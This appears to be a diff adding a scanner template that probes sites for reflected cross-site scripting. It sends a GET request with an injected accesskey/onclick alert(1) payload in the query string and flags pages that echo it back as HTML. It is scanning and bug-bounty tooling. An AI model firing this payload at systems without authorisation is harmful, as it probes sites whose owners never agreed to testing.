@@ -1,0 +1,21 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - '''x''onclick=''alert(1)'
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/?%27accesskey=%27x%27onclick=%27alert(1)'
+id: canonical-xss
+info:
+  author: reewardius
+  name: ALT Shift XSS GET Parameters
+  reference: https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8
+  severity: medium
+  tags: xss,generic
